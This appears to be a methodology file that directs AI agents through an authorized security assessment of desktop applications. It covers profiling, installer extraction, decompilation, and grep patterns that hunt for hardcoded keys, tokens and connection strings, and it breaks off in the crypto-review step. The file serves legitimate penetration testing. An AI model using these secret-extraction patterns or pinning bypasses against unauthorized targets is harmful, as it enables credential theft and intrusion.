---
name: W_HUNT_THICK_CLIENT
description: Desktop application and thick client security assessment
trigger: Desktop application (Electron, .NET, Java, native) detected
engagement: thick-client
agents: [AppReviewAgent, DesktopAppAgent, ReverseEngineeringAgent, MemoryCorruptionAgent, FirmwareAgent, ExploitDevAgent, AuthAgent, APIAgent, SQLiAgent, RCEAgent, DeserializationAgent, CommandInjectionAgent, PathTraversalAgent, SecretsExposureAgent, ValidatorAgent, ExploitChainAgent]
tools: [hunt-orchestrator, agent-router, credential-vault, auth-manager, burp-bridge, playwright-harness]
skills_invoked: [ReverseEngineering]
---

# W_HUNT_THICK_CLIENT — Desktop/Thick Client Security Assessment

> Complete senior-level methodology for assessing desktop applications and thick clients: Electron/CEF, .NET (Framework / Core / WPF / WinForms), Java/JavaFX/Swing, Qt, native C/C++, Go and PyInstaller binaries. The thick client is two attack surfaces fused into one — a fat trusted client running on hardware you control, talking to a backend that wrongly assumes the client is honest. This file drives both: client-side (binary, config, secrets, local IPC, update channel, framework escapes, memory, anti-tamper, license) and server-side (the client is just a discoverable, tamperable API consumer — auth, injection, and BOLA all apply once you proxy and unpin it). Every technique routes traffic through Burp, uses a real browser User-Agent for any HTTP, saves artifacts to the run output directory, and ends in an explicit specialist dispatch.

---

## Operating Doctrine

The mindset a seasoned thick-client lead brings to every engagement. Read this before touching the binary.

- **Understand before you attack.** The thick client *is* the documentation of the backend. You hold the compiled business logic, the API contract, the auth scheme, the crypto, and the secrets in your hand. Profile and reverse-engineer first (Phases 1-2); a payload fired before you understand the trust boundaries is noise.
- **Two clients, one app.** Decide per finding whether the bug lives client-side (runs with the *user's* privilege on the user's box) or server-side (the client is a tamperable API consumer). Client-side bugs need a victim or a privilege delta to matter; server-side bugs (auth, injection, BOLA) matter the moment you unpin and replay. Test both surfaces — most teams test only one.
- **The client cannot be trusted to defend itself.** Cert pinning, root/jailbreak checks, anti-debug, integrity checks and license gates are all client-side controls running on attacker-controlled hardware. They are speed bumps to be removed (Frida, patching), never security boundaries. Removing them is a step, not the finding — the finding is what they were hiding.
- **Hypothesis-driven, not scanner-driven.** Every technique below starts from a stated hypothesis ("this `.config` holds a DB connection string", "this update channel is unsigned HTTP", "this IPC handler shells out"). You are confirming or killing a hypothesis, not spraying.
- **Proxy everything.** All HTTP(S) flows through Burp at `http://127.0.0.1:8080`. Apps that ignore the system proxy get forced (Proxifier / iptables / `NODE_OPTIONS` / JVM flags). Pinned TLS gets unpinned with Frida. If a single byte of backend traffic is invisible, the interception step is not done.
- **Evidence capture is non-negotiable.** Decompiled source, hooked-function logs, memory dumps, Procmon CSVs, HAR exports, registry exports, and signed/unsigned update proofs all land in `$OUT`. A finding without a reproducible artifact does not survive ValidatorAgent.
- **Scope discipline.** Only the named binary, its installer, its data directories, its registered services/handlers, and the explicitly in-scope backend hosts. The hard scope guard in Pre-Flight is a gate, not a suggestion — a thick client often talks to third-party telemetry/CDN/SSO hosts you are NOT authorized to test.
- **Depth vs breadth.** Profile broad (every framework, every endpoint, every store) but go deep where the crown jewels live: auth material, the update path (one bug = fleet-wide RCE with persistence), privileged helper services, and deserialization sinks. A confirmed update-hijack or deserialization-RCE outranks ten plaintext-config findings.

---

## Pre-Flight

Establish the harness before the first technique. Nothing below runs until this block is green.

```bash
# --- Canonical per-session output dir (framework standard: Sessions/<slug>, == hunt-orchestrator state.sessionDir) ---
export ENGAGEMENT="thick-client"
export TARGET="https://api.target.com"          # primary in-scope backend / app identity
# slug derivation mirrors hunt-orchestrator toSlug(): strip scheme, non-alnum -> '-', collapse, trim, lowercase
export SLUG="$(printf '%s' "$TARGET" | sed -E 's#^https?://##; s#[^a-zA-Z0-9]+#-#g; s#^-|-$##g' | tr '[:upper:]' '[:lower:]')"
export OUT="$HOME/.claude/MEMORY/BugBounty/Sessions/$SLUG"
# My working subdirs (local app-profiling lives in profiling/, NOT recon/ which the recon workflow owns).
# findings/, artifacts/, screenshots/ are the orchestrator-canonical names; findings/ is what ValidatorAgent reads.
mkdir -p "$OUT"/{profiling,static,traffic,storage,runtime,update,findings,artifacts,screenshots}
echo "[*] Session dir (canonical): $OUT"

# --- Ingest the recon hand-off (W_RECON writes it under the SAME session slug; read-only here) ---
export RECON="$OUT/recon"   # owned by the recon workflow: reports/ + cloud/ ports/ content/ js/ scope/ hosts/ tech/ leaks/ takeover/
cat "$RECON/reports/handoff-notes.md" 2>/dev/null                                   # per-domain hand-off narrative
jq -r '.[]?|.host//.url//empty' "$RECON/reports/attack-surface-inventory.json" 2>/dev/null | sort -u > "$OUT/profiling/recon-surface.txt"
cat "$RECON/reports/high-priority-targets.txt" 2>/dev/null                          # seeds Burp scope + endpoint pre-map (Phase 1.5 / 4.4)

# --- Browser User-Agent for any HTTP we generate by hand ---
export UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

# --- Burp proxy + REST API wiring ---
export BURP_PROXY="http://127.0.0.1:8080"
export BURP_API="http://127.0.0.1:1337/v0.1"
# Verify Burp proxy + REST API are alive (falls back to mitmproxy hint if down)
bun skills/BugBountyFramework/Tools/burp-bridge.ts --health

# --- Sync engagement scope into Burp (HARD SCOPE GUARD) ---
# Only the explicitly authorized backend hosts. Everything else is out of scope.
export INSCOPE="api.target.com,*.target.com,update.target.com"
bun skills/BugBountyFramework/Tools/burp-bridge.ts --sync-scope --scope "$INSCOPE"
# Burp must be set to "intercept in-scope items only" so third-party SSO/telemetry/CDN are never touched.
# Recon seed: $OUT/recon/reports/high-priority-targets.txt + the recon scope/ dir inform INSCOPE — confirm each host is authorized before adding; never widen scope to a host recon merely observed.

# --- Burp CA into the OS / runtime trust stores (needed for TLS interception) ---
# Export Burp CA: Proxy > Proxy settings > Import/export CA certificate > DER, then:
#   Windows : certutil -addstore -f Root burp-ca.cer   (or per-user: certutil -user -addstore Root burp-ca.cer)
#   macOS   : sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain burp-ca.der
#   Linux   : cp burp-ca.crt /usr/local/share/ca-certificates/burp.crt && update-ca-certificates
# Runtime-specific trust (apps that ignore the OS store):
#   .NET    : usually honours the OS store; Core may need SSL_CERT_FILE=$OUT/burp-ca.pem
#   Java    : keytool -importcert -alias burp -file burp-ca.der -keystore "$JAVA_HOME/lib/security/cacerts" -storepass changeit -noprompt
#   Node/Electron : export NODE_EXTRA_CA_CERTS="$OUT/burp-ca.pem"

# --- Multi-identity credentials from the vault (NEVER inline secrets) ---
# Provision at least a low-priv and an admin/elevated identity for BOLA/authz testing.
bun skills/BugBountyFramework/Tools/credential-vault.ts --store --target thick-lowpriv --op-item "target-lowpriv"
bun skills/BugBountyFramework/Tools/credential-vault.ts --store --target thick-admin   --op-item "target-admin"
bun skills/BugBountyFramework/Tools/credential-vault.ts --list   # confirm both identities present (values stay in the vault)

# --- Authenticated backend session for replay/server-side testing ---
# auth-manager drives the login flow and persists session/token state, pulling creds from the vault.
bun skills/BugBountyFramework/Tools/auth-manager.ts --target https://api.target.com --authenticate --strategy api --creds-from vault:thick-lowpriv
bun skills/BugBountyFramework/Tools/auth-manager.ts --target https://api.target.com --check

# --- Confirm the dispatch plan for this engagement ---
bun skills/BugBountyFramework/Tools/agent-router.ts --engagement thick-client   # understand/hunt/validate/chain plan

# --- Surface external per-domain tooling actually installed for this run ---
piranha tools thick-client    # expect: ghidra, frida, ilspycmd (+ Burp Suite MCP)
```

Required state before Phase 1:
- Burp `--health` returns proxy+api alive (or a documented mitmproxy fallback in `$OUT/traffic/`).
- Scope synced; Burp restricted to in-scope only; hard scope guard understood.
- Recon hand-off ingested from `$OUT/recon/reports/` (attack-surface-inventory.json, high-priority-targets.txt, handoff-notes.md); hosts it flags as third-party stay out of scope.
- Burp CA trusted by the OS and by each runtime the target uses.
- At least two identities (low-priv + admin) in the vault; never echoed to disk in plaintext.
- A dedicated, snapshot-able test VM (Windows + macOS/Linux as the target dictates) so registry/ACL/DLL-plant changes are reversible.

---

## Coverage Matrix

Authoritative thick-client checklist mapped to the phase/technique that covers it. If a row has no coverage, the assessment is incomplete.

| # | Authoritative checklist item | Covered by |
|---|------------------------------|------------|
| 1 | Information gathering — framework/runtime fingerprint, installer, FS/registry footprint | Phase 1.1-1.5 |
| 2 | Reverse engineering — native (ghidra, strings, binwalk) | Phase 2.1, 2.6 |
| 3 | Reverse engineering — .NET (ilspycmd / dnSpy / dotPeek, de4dot) | Phase 2.2 |
| 4 | Reverse engineering — Java (jadx / JD-GUI / CFR / Procyon) | Phase 2.3 |
| 5 | Reverse engineering — Electron/ASAR extraction | Phase 2.4, 9.1 |
| 6 | Runtime instrumentation (Frida) for hooks and pinning bypass | Phase 4.3, 11.3 |
| 7 | Config & secret extraction — hardcoded creds/keys/endpoints | Phase 2.5, 3.1 |
| 8 | Config & secret extraction — connection strings | Phase 2.5, 3.1, 3.3 |
| 9 | Config & secret extraction — Windows registry | Phase 3.2 |
| 10 | Config & secret extraction — app config files (.config/.json/.xml/.plist/.ini) | Phase 3.1 |
| 11 | Config & secret extraction — OS credential stores (DPAPI / Keychain / keyring) | Phase 3.4 |
| 12 | Config & secret extraction — local DB / logs leakage | Phase 3.3, 3.5 |
| 13 | Local attack surface — insecure file ACLs | Phase 8.1 |
| 14 | Local attack surface — insecure registry ACLs | Phase 8.2 |
| 15 | Local attack surface — DLL search-order hijacking / planting | Phase 8.3 |
| 16 | Local attack surface — unquoted service paths | Phase 8.4 |
| 17 | Local attack surface — named-pipe / IPC abuse (pipes, sockets, COM, D-Bus, XPC) | Phase 8.5 |
| 18 | Local attack surface — custom URI / protocol handler abuse | Phase 8.6 |
| 19 | Local attack surface — privileged helper / service trust boundary | Phase 8.7 |
| 20 | Auto-update — unsigned / MITM-able update channel | Phase 7.1, 7.2 |
| 21 | Auto-update — downgrade / rollback | Phase 7.3 |
| 22 | Auto-update — writable staging dir / TOCTOU / DLL side-load via updater | Phase 7.4 |
| 23 | Electron — nodeIntegration enabled | Phase 9.2 |
| 24 | Electron — contextIsolation off / preload exposure | Phase 9.3 |
| 25 | Electron — IPC renderer->main abuse | Phase 9.4 |
| 26 | Electron — protocol/deep-link handlers & openExternal | Phase 9.5 |
| 27 | Electron — DevTools / remote debugging / insecure webPreferences | Phase 9.6 |
| 28 | .NET deserialization (BinaryFormatter / Json.NET TypeNameHandling / ViewState / remoting) | Phase 10.1 |
| 29 | Java deserialization (ObjectInputStream / XStream / SnakeYAML / Kryo) | Phase 10.2 |
| 30 | Java JNDI injection / Log4Shell | Phase 10.3 |
| 31 | Java RMI / JMX exploitation | Phase 10.4 |
| 32 | TLS interception — proxy config (system/forced) | Phase 4.1 |
| 33 | TLS interception — CA install per runtime | Pre-Flight + Phase 4.1 |
| 34 | TLS interception — cert pinning bypass via Frida | Phase 4.2 |
| 35 | Backend/API traffic capture & endpoint mapping | Phase 4.4, 4.5 |
| 36 | Server-side — authentication & session testing | Phase 5.1 |
| 37 | Server-side — authorization / BOLA / BFLA / mass assignment | Phase 5.2 |
| 38 | Server-side — injection (SQLi/NoSQLi/cmd) over the API | Phase 5.3 |
| 39 | Server-side — business-logic / replay / signature abuse | Phase 5.4 |
| 40 | Client-side injection — SQLi into local DB | Phase 6.1 |
| 41 | Client-side injection — RCE via unsafe sinks (eval/exec/format) | Phase 6.2 |
| 42 | Client-side injection — OS command injection | Phase 6.3 |
| 43 | Client-side injection — path traversal / arbitrary file read-write | Phase 6.4 |
| 44 | Memory — secrets in memory post-logout, dump analysis | Phase 11.2 |
| 45 | Anti-tamper / integrity / anti-debug bypass | Phase 11.4 |
| 46 | License / trial / feature-flag bypass | Phase 11.5 |
| 47 | Crypto misuse (weak algos, hardcoded keys, ECB, static IV) | Phase 2.7, 11.1 |
| 48 | Validation, de-dup, CVSS, kill-chain correlation, reporting | Reporting & Hand-off |

---

## Dispatch Map (engagement: thick-client)

| Stage | Owning specialist agents | Role in this workflow |
|-------|--------------------------|-----------------------|
| understand | AppReviewAgent, DesktopAppAgent, ReverseEngineeringAgent | Build the AppProfile, fingerprint runtime, map trust boundaries, decompile, locate sinks/secrets |
| hunt | AuthAgent, APIAgent, SQLiAgent, RCEAgent, DeserializationAgent, CommandInjectionAgent (+ PathTraversalAgent, SecretsExposureAgent, MemoryCorruptionAgent, ExploitDevAgent for native) | Confirm exploitable bugs across client + server surfaces |
| validate | ValidatorAgent | Reproduce, de-dup by root cause, score CVSS, apply hunt-mode gate |
| chain | ExploitChainAgent | Correlate single findings into kill chains, elevate combined CVSS, write the final report |

Specialists consume the shared AppProfile at `/tmp/app-profile.json` and append confirmed findings to `/tmp/bb-findings-<class>.json` (mirrored into `$OUT/findings/`), which ValidatorAgent then ingests.

---

## References

- OWASP Desktop App Security Top 10
- OWASP MASVS/MASTG (thick-client analogues: storage, crypto, network, resilience)
- OWASP WSTG / API Security Top 10 (apply to the backend the client consumes)
- MITRE ATT&CK — Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access
- CWE: 798, 502, 917, 94, 78, 89, 22, 427, 426, 428, 269, 367, 494, 295, 319, 312, 316, 327, 353, 354, 489, 532

---

## PHASE 1: APP PROFILING & ATTACK-SURFACE MAPPING

**Objective:** Identify the framework, architecture, dependencies, installed components, and the complete file/registry/network footprint before any testing.

**Expert rationale:** The runtime dictates the entire toolchain (ASAR vs dnSpy vs jadx vs Ghidra) and the bug classes worth chasing (Electron escapes vs .NET deserialization vs native memory corruption). Profiling the installer and footprint also reveals priv-esc primitives (services, scheduled tasks, ACLs) for free — those who attack before profiling burn time on the wrong framework.

**Gate-in:** Pre-Flight green; target binary/installer obtained; isolated, snapshot-able VM ready.

### 1.1 Binary / Runtime Identification

- **Objective / hypothesis:** The binary is built with a specific compiler/runtime/packer that determines decompilation strategy.
- **Procedure:**
```bash
cd "$OUT/profiling"
# Detect It Easy — compiler, packer, framework
diec --json application.exe > die_report.json; diec application.exe
# Native headers
file application.exe; readelf -a ./app 2>/dev/null | head -40; objdump -x ./app 2>/dev/null | head
# macOS Mach-O
otool -L application.app/Contents/MacOS/application 2>/dev/null
codesign -dv --verbose=4 application.app 2>&1 | tee codesign.txt
# PE metadata
python3 -c "import pefile,sys; pe=pefile.PE('application.exe'); print(pe.dump_info())" > pe_info.txt 2>/dev/null
# checksec on native ELF/PE (mitigation posture for later memory work)
checksec --file=./app 2>/dev/null | tee checksec.txt
```
- **Indicators:** DIE names the compiler/packer; a CLR header => .NET; Mach-O/ELF with no managed runtime => native; `UPX`/themida strings => packed.
- **Validation:** Cross-check DIE against the framework signatures in 1.2; a packed binary must be unpacked before strings/decompile are trustworthy.
- **Evasion / edge cases:** Packers (UPX, Themida, VMProtect) hide real strings/imports — unpack (e.g. `upx -d`) or dump from memory at runtime (Phase 11.2). Obfuscated .NET => de4dot (Phase 2.2).
- **Severity:** Informational (drives everything downstream).
- **Dispatch:** -> ReverseEngineeringAgent (native triage), DesktopAppAgent (managed runtimes).

### 1.2 Framework Detection

- **Objective / hypothesis:** Confirm exactly which runtime(s) ship so the right Phase (9/10/11) is engaged.
- **Procedure:**
```bash
cd "$OUT/profiling"
ls resources/app.asar 2>/dev/null && echo "ELECTRON"
strings -n 6 application.exe | grep -iE "electron|libcef|cef_sandbox" | head
strings -n 6 application.exe | grep -iE "mscorlib|System.Runtime|\.NETFramework|\.NETCoreApp" | head   # .NET
ls *.deps.json *.runtimeconfig.json 2>/dev/null                                                          # .NET Core/5+
file application.jar 2>/dev/null; unzip -l application.jar 2>/dev/null | head                            # Java
strings -n 6 application.exe | grep -iE "MEIPASS|pyinstaller" | head                                     # PyInstaller
strings -n 6 application.exe | grep -iE "Qt5Core|Qt6Core" | head                                         # Qt
strings -n 6 application.exe | grep -iE "go.buildid|runtime\\." | head                                   # Go
```

| Framework | Detection signatures |
|-----------|----------------------|
| Electron | `resources/app.asar`, `node_modules/`, `package.json`, Chrome DevTools protocol |
| CEF | `libcef.dll`, `cef_sandbox.dll` |
| .NET FW | `mscorlib` ref, CLR runtime header, `*.config` |
| .NET Core/5+ | `*.deps.json`, `*.runtimeconfig.json`, `hostfxr.dll` |
| Java | `.jar`/`.war`, `META-INF/MANIFEST.MF`, `java(w).exe` |
| Qt / WPF | `Qt[56]Core.dll`, `qml/` / `PresentationFramework.dll`, `.xaml` |
| Native | no managed runtime; links `msvcrt`/`libc` |
| PyInstaller / Go | `_MEIPASS`/`base_library.zip` / large static, `go.buildid` |

- **Indicators:** A positive signature for one or more runtimes (hybrid apps exist — e.g. Electron front + native helper service).
- **Validation:** Launch under Procmon/`ProcessExplorer` and confirm loaded modules match the static signature.
- **Evasion / edge cases:** Hybrid clients (Electron UI + native/.NET privileged helper) need multiple phases; renamed `electron.exe` still ships `app.asar`.
- **Severity:** Informational.
- **Dispatch:** -> AppReviewAgent (record runtime in `tech_stack.desktop_runtime`).

### 1.3 Installer Analysis

- **Objective / hypothesis:** The installer embeds secrets, sets insecure ACLs, installs services/tasks, or runs elevated pre/post scripts.
- **Procedure:**
```bash
cd "$OUT/profiling"
lessmsi x installer.msi msi_extract/ 2>/dev/null || msiexec /a installer.msi /qn TARGETDIR="$PWD\\msi_extract"
7z x installer.exe -onsis_extract 2>/dev/null            # NSIS
innounp -x -dinno_extract installer.exe 2>/dev/null      # InnoSetup
hdiutil attach installer.dmg -mountpoint /tmp/dmg 2>/dev/null; pkgutil --expand installer.pkg /tmp/pkg 2>/dev/null
# Hunt embedded secrets + dangerous install actions
grep -rniE "password|secret|api[_-]?key|token|connectionstring|BEGIN .*PRIVATE KEY" msi_extract nsis_extract inno_extract 2>/dev/null
grep -rniE "icacls|cacls|net localgroup|sc create|schtasks|reg add" inno_extract nsis_extract 2>/dev/null
```
- **Indicators:** Hardcoded creds/keys; install scripts granting `Everyone`/`Users` write to program dir; services created to run as SYSTEM; scheduled tasks.
- **Validation:** Install in the VM, then snapshot ACLs (Phase 8) and service config (Phase 8.4) to confirm the insecure state persists post-install.
- **Evasion / edge cases:** Some installers download payloads at runtime — capture that fetch in Burp (Phase 7).
- **Severity:** High if elevated install actions create a persistent priv-esc primitive (CWE-269).
- **Dispatch:** -> DesktopAppAgent.

### 1.4 File System & Registry Footprint Mapping

- **Objective / hypothesis:** The app reads/writes data, config, and creds in predictable locations; mapping them seeds Phases 3 and 8.
- **Procedure:**
```text
# Windows — Procmon: filter Process Name is application.exe; capture File+Registry+Network+Process.
#   Exercise login + core flows, then File > Save > CSV to $OUT/profiling/procmon.csv
# Key locations to enumerate:
#   %APPDATA%/%LOCALAPPDATA%/%PROGRAMDATA%/%TEMP%\App\ ; HKCU\Software\App ; HKLM\Software\App
# macOS:  ~/Library/Application Support/App ; ~/Library/Preferences/com.vendor.app.plist ; ~/Library/Caches/App
# Linux:  ~/.config/App ; ~/.local/share/App ; /tmp/App
```
```bash
# Quick cross-platform enumeration of the data dir once Procmon points at it:
APPDIR="$HOME/.config/App"; find "$APPDIR" -type f -printf '%M %p\n' 2>/dev/null | tee "$OUT/profiling/datadir-acls.txt"
```
- **Indicators:** Sensitive files in world-readable/writable paths; registry reads of credential keys during login (RegQueryValue in Procmon).
- **Validation:** Confirm each location actually contains data by inspecting in Phase 3.
- **Evasion / edge cases:** Some apps mmap to per-user vs machine-wide stores depending on install mode — enumerate both.
- **Severity:** Informational here; feeds High/Critical findings later.
- **Dispatch:** -> AppReviewAgent (footprint) ; -> DesktopAppAgent (insecure paths).

### 1.5 Backend Surface Pre-Map (passive)

- **Objective / hypothesis:** The client embeds backend hostnames/endpoints discoverable before any traffic flows.
- **Procedure:**
```bash
cd "$OUT/profiling"
strings -n 8 application.exe | grep -iE "https?://" | sort -u | tee endpoints_static.txt
# For Electron: same grep over extracted ASAR (Phase 2.4). For .NET/Java: over decompiled source (Phase 2.2/2.3).
# Merge with the recon workflow's attack surface (ingested in Pre-Flight to profiling/recon-surface.txt):
sort -u endpoints_static.txt recon-surface.txt 2>/dev/null | tee endpoints_merged.txt
```
- **Indicators:** API base URLs, update URLs, telemetry/SSO hosts.
- **Validation:** Reconcile against `$OUT/recon/reports/attack-surface-inventory.json` + `high-priority-targets.txt` (from W_RECON) and, once live, the Burp sitemap (Phase 4.4); endpoints only the binary knows are extra surface the recon scan missed.
- **Evasion / edge cases:** Endpoints may be assembled at runtime (string concat / config) — only Phase 4 capture is authoritative. Flag third-party hosts as OUT of scope.
- **Severity:** Informational.
- **Dispatch:** -> AppReviewAgent ; out-of-scope hosts noted, never tested.

**Phase artifacts:** `die_report.json`, `pe_info.txt`/`checksec.txt`, `codesign.txt`, framework verdict, installer extract, `procmon.csv`, `datadir-acls.txt`, `endpoints_static.txt`, and a seeded `/tmp/app-profile.json` (`tech_stack`, `platform`, data paths, candidate endpoints, privileged components).

**Gate-out:** Runtime(s) confirmed; data/registry locations enumerated; installer-driven priv-esc primitives noted; AppProfile seeded. Advance to Phase 2.

---

## PHASE 2: STATIC ANALYSIS & REVERSE ENGINEERING

**Objective:** Recover source/IL/bytecode, extract strings and secrets, locate dangerous sinks and crypto, and map the certificate/update logic.

**Expert rationale:** Static recovery turns a black box into reviewable source. Decompiled code reveals deserialization sinks, command/SQL sinks, hardcoded secrets, pinning logic, and license checks — the exact targets the hunt phases will confirm dynamically. Doing this before dynamic work means every runtime hook is aimed, not exploratory.

**Gate-in:** Phase 1 framework verdict; binary unpacked/de-obfuscated as needed.

### 2.1 Native Reverse Engineering (Ghidra / radare2)

- **Objective / hypothesis:** Native binaries contain auth/crypto/parsing routines and dangerous C functions exploitable for logic bypass or memory corruption.
- **Procedure:**
```bash
cd "$OUT/static"
# Headless Ghidra auto-analysis + a string/symbol export
analyzeHeadless "$OUT/static/ghidra_proj" thickclient -import ../profiling/application.exe \
  -postScript ghidra_scripts/ExportStringsAndFuncs.java 2>&1 | tee ghidra.log
# radare2 quick triage
r2 -q -c "aaa; afl~auth; iz~http; /c strcpy; /c system" ../profiling/application.exe | tee r2_triage.txt
# binwalk for embedded blobs/firmware-ish payloads inside the binary or resources
binwalk -e ../profiling/application.exe -C binwalk_out 2>/dev/null
```
- **Indicators:** `strcmp`/`memcmp` near license/auth; crypto constants (AES S-box, SHA round constants); `strcpy`/`sprintf`/`gets` (overflow candidates); `system`/`exec` (command sinks).
- **Validation:** Confirm reachability with a runtime breakpoint (Phase 11) before claiming a bug.
- **Evasion / edge cases:** Stripped symbols => use FLIRT/signatures, string xrefs, and constants to find functions. Statically linked Go/Rust => use language-aware tooling.
- **Severity:** Up to Critical for native RCE (CWE-787/416) — but confirm exploitability under the mitigations from `checksec`.
- **Dispatch:** -> ReverseEngineeringAgent ; memory-corruption primitives -> MemoryCorruptionAgent -> ExploitDevAgent.

### 2.2 .NET Decompilation (ilspycmd / dnSpy / dotPeek)

- **Objective / hypothesis:** Managed assemblies decompile cleanly to near-source, exposing secrets, sinks and validation logic.
- **Procedure:**
```bash
cd "$OUT/static"
de4dot application.exe -o application_clean.exe 2>/dev/null    # de-obfuscate first if needed
ilspycmd application_clean.exe -o dotnet_src/ 2>/dev/null || ilspycmd application.exe -o dotnet_src/
# dnSpy (GUI) for interactive review, edit-and-continue, and IL patching (Phase 10/11)
grep -rniE "ConnectionString|Password|ApiKey|Secret|Token|Bearer" dotnet_src/ | tee dotnet_secrets.txt
grep -rniE "BinaryFormatter|SoapFormatter|LosFormatter|NetDataContractSerializer|TypeNameHandling" dotnet_src/ | tee dotnet_deser.txt
grep -rniE "Process\\.Start|cmd\\.exe|/bin/sh|ProcessStartInfo" dotnet_src/ | tee dotnet_cmd.txt
grep -rniE "SqlCommand|SqlConnection|ExecuteReader|String\\.Format.*SELECT" dotnet_src/ | tee dotnet_sql.txt
```
- **Indicators:** Hits in any of the secret/deser/cmd/sql greps; weak crypto (`DES`, `MD5`, `ECB`, static IV).
- **Validation:** Map each sink to a reachable input (network, file, IPC, URI) before chasing it dynamically.
- **Evasion / edge cases:** ConfuserEx/SmartAssembly control-flow flattening => de4dot + manual cleanup; single-file Core publishes => extract bundle first (`Microsoft.NET.HostModel`/`ilspycmd` on the embedded assemblies).
- **Severity:** Critical for deserialization/cmd/SQL sinks reachable with attacker input; High for hardcoded secrets (CWE-798).
- **Dispatch:** -> DesktopAppAgent (overall) ; deser sinks -> DeserializationAgent ; cmd sinks -> CommandInjectionAgent ; SQL -> SQLiAgent ; secrets -> SecretsExposureAgent.

### 2.3 Java Decompilation (jadx / JD-GUI / CFR / Procyon)

- **Objective / hypothesis:** JAR/WAR bytecode decompiles to readable Java, exposing the same sink/secret classes plus JNDI/RMI.
- **Procedure:**
```bash
cd "$OUT/static"
jadx -d java_src/ application.jar 2>/dev/null
java -jar cfr.jar application.jar --outputdir java_cfr/ 2>/dev/null     # CFR cross-check
cat $(find . -name MANIFEST.MF) 2>/dev/null                            # Main-Class / Class-Path
grep -rniE "password|secret|api[_-]?key|jdbc:|getConnection|DriverManager" java_src/ | tee java_secrets.txt
grep -rniE "ObjectInputStream|readObject|XMLDecoder|XStream|SnakeYAML|Kryo" java_src/ | tee java_deser.txt
grep -rniE "Runtime.getRuntime\\(\\).exec|ProcessBuilder|ScriptEngine|eval\\(" java_src/ | tee java_cmd.txt
grep -rniE "InitialContext|Context.lookup|log4j" java_src/ | tee java_jndi.txt
```
- **Indicators:** Hits in any grep; vulnerable gadget libs in `pom.xml`/`build.gradle` (commons-collections, spring, groovy, beanutils).
- **Validation:** Confirm a gadget chain is on the classpath before asserting deser-RCE (Phase 10.2).
- **Evasion / edge cases:** ProGuard-obfuscated names => CFR/Procyon cross-decompile and rename by behavior; shaded JARs hide dependency versions — inspect class bytes.
- **Severity:** Critical for deser/JNDI RCE; High for plaintext JDBC creds.
- **Dispatch:** -> DesktopAppAgent ; deser -> DeserializationAgent ; JNDI/Log4Shell -> RCEAgent ; cmd -> CommandInjectionAgent ; secrets -> SecretsExposureAgent.

### 2.4 Electron ASAR Extraction & Source Review

- **Objective / hypothesis:** Electron ships its full JS source inside `app.asar`; extraction yields config, secrets, IPC handlers and webPreferences.
- **Procedure:**
```bash
cd "$OUT/static"
npx --yes @electron/asar extract resources/app.asar electron_src/ 2>/dev/null \
  || asar extract resources/app.asar electron_src/
grep -rniE "api[_-]?key|secret|password|token|BEGIN .*PRIVATE KEY" electron_src/ | tee electron_secrets.txt
grep -rniE "nodeIntegration|contextIsolation|enableRemoteModule|webSecurity|sandbox|allowRunningInsecureContent" electron_src/ | tee electron_webprefs.txt
grep -rniE "ipcMain\\.(handle|on)|ipcRenderer\\.(send|invoke)|contextBridge|exposeInMainWorld" electron_src/ | tee electron_ipc.txt
grep -rniE "shell\\.openExternal|child_process|require\\('child_process'\\)|setAsDefaultProtocolClient" electron_src/ | tee electron_sinks.txt
( cd electron_src && npm audit --json > "$OUT/static/electron_npm_audit.json" 2>/dev/null )
```
- **Indicators:** Dangerous webPreferences (Phase 9), exposed IPC channels reaching `child_process`/`fs`, hardcoded secrets, vulnerable npm deps.
- **Validation:** Confirm each suspicious config against the running app's actual BrowserWindow (Phase 9).
- **Evasion / edge cases:** Code may be webpack-bundled/minified — beautify (`js-beautify`) and use sourcemaps if present; `app.asar.unpacked` holds native modules.
- **Severity:** Critical if a config => renderer RCE (CWE-94).
- **Dispatch:** -> DesktopAppAgent (Electron specifics in Phase 9).

### 2.5 Hardcoded Secret & Endpoint Extraction

- **Objective / hypothesis:** Secrets, keys, connection strings and endpoints are embedded in the binary/resources.
- **Procedure:**
```bash
cd "$OUT/static"
strings -n 8 ../profiling/application.exe  > strings_ascii.txt
strings -n 8 -el ../profiling/application.exe >> strings_ascii.txt    # UTF-16LE
floss ../profiling/application.exe > strings_floss.txt 2>/dev/null    # deobfuscated strings
for f in strings_ascii.txt strings_floss.txt dotnet_src java_src electron_src; do :; done
grep -hiE "password|passwd|secret|token|api[_-]?key|bearer|jwt|session" strings_*.txt | sort -u | tee secrets_candidates.txt
grep -hiE "AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|xox[baprs]-[0-9A-Za-z-]+|-----BEGIN" strings_*.txt | tee secrets_highconf.txt
grep -hiE "Server=|Data Source=|jdbc:|mongodb(\\+srv)?://|postgres(ql)?://|mysql://|redis://" strings_*.txt | tee connstrings.txt
```
- **Indicators:** Live-looking keys/tokens, DB connection strings, private keys.
- **Validation:** Validate each secret against its provider (e.g. `aws sts get-caller-identity`, an authenticated API call via Burp with the UA) — only live secrets are findings.
- **Evasion / edge cases:** Secrets may be base64/XOR/encrypted with a key also in the binary — recover the key, decode, then revalidate. Distinguish client identifiers (public) from real secrets.
- **Severity:** Critical for live, privileged secrets (CWE-798); Low/Informational for public client IDs.
- **Dispatch:** -> SecretsExposureAgent (validate + map blast radius) ; cloud creds -> note for Cloud chain.

### 2.6 Embedded Resource & Asset Carving

- **Objective / hypothesis:** Installers/binaries embed secondary binaries, configs, certs, or scripts.
- **Procedure:**
```bash
cd "$OUT/static"
binwalk -e ../profiling/application.exe -C carve/ 2>/dev/null
# .NET resources
ilspycmd application.exe --type "*" -o dotnet_resources/ 2>/dev/null
# Inspect carved files for additional secrets/certs/scripts
grep -rniE "BEGIN .*PRIVATE KEY|api[_-]?key|password" carve/ 2>/dev/null
```
- **Indicators:** Bundled private keys, secondary updaters/helpers, embedded scripts.
- **Validation:** Treat carved binaries as new targets (re-enter Phase 1 if a privileged helper appears).
- **Evasion / edge cases:** Compressed/encrypted resources need the loader's key (recover via Phase 11 hook).
- **Severity:** Varies; bundled private signing keys are Critical.
- **Dispatch:** -> ReverseEngineeringAgent ; keys -> SecretsExposureAgent.

### 2.7 Certificate Validation & Crypto Review (static)

- **Objective / hypothesis:** The app implements (or disables) cert validation and uses crypto whose weaknesses are visible in source.
- **Procedure:**
```bash
cd "$OUT/static"
